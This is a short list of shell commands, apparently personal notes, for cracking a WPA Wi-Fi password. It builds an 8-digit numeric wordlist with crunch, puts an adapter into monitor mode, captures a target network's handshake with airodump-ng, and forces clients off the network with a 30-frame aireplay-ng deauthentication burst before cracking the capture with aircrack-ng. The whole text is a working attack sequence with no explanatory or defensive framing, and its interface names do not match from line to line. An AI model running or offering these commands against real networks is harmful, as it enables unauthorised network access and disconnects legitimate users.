crunch 8 8 -t %%%%%%%% -o pass8.txt
echo 1|sudo tee /proc/brcm_monitor0
airmon-ng start wlo0
airodump-ng prism0
airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0
aireplay-ng -0 30 -a 14:60:80:CE:D3:F2 -e E0:06:E6:6A:6C:E6 prism0 --ignore-negative-one
aircrack-ng dump-02.cap -w pass8.txt  
